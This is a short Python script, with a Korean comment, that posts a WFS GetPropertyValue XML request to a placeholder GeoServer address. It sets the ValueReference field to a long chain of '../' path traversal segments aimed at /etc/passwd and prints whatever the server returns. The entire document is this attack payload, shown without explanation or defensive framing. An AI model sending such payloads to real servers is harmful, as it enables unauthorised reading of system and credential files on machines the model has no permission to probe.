import requests

url = "http://<target_geoserver>/geoserver/wfs" # GeoServer WFS 엔드포인트
payload = """
<wfs:GetPropertyValue service="WFS" version="1.1.0" xmlns:wfs="http://www.opengis.net/wfs" xmlns:ogc="http://www.opengis.net/ogc">
  <wfs:ValueReference><![CDATA[//prop/../../../../../../../../../../../../../../../../../../etc/passwd]]></wfs:ValueReference>
</wfs:GetPropertyValue>
"""

headers = {"Content-Type": "application/xml"}
response = requests.post(url, headers=headers, data=payload)

print(response.text)
